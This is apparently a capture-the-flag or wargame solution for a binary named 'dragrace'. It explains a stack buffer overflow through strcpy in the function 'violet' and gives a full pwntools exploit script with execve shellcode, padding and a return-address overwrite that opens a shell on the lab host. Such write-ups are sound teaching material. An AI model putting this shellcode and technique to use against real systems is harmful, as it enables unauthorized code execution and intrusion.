# SOLUTION

The binary strcpys up to 512 bytes from a location in the heap onto a stack that
has 128 bytes allocated for a character buffer in the function 'violet'.
However, you need to pass a check on the first 8 bytes of the input. The binary
provides the address of the heap buffer.

If you reverse the binary, you can retrieve the values that pass the check on
the first 8 bytes of the input. Now, you can overwrite RIP by smashing the stack
and place your shellcode at index 8 of the input then jump to that location.

The solution script:

```py
from pwn import *

shellcode = ("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb" +
             "\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

#context.log_level = "debug"

def main():
    #p = process("./dragrace")
    p = remote("wargame", 31342)

    p.recvuntil("Hiiiiiie, I live at ")
    leak_line = p.recvline().strip()
    buffer_address = int(leak_line, 16)
    log.info("Buffer Address: 0x%x" % buffer_address)

    payload = "Ru'Pauls" + shellcode
    payload = payload.ljust(136, "\x90")
    payload += p64(buffer_address + 8)

    p.sendline(payload)

    p.recvrepeat(0.2)
    log.success("Enjoy your shell")
    p.interactive()

if __name__ == "__main__":
    main()
```
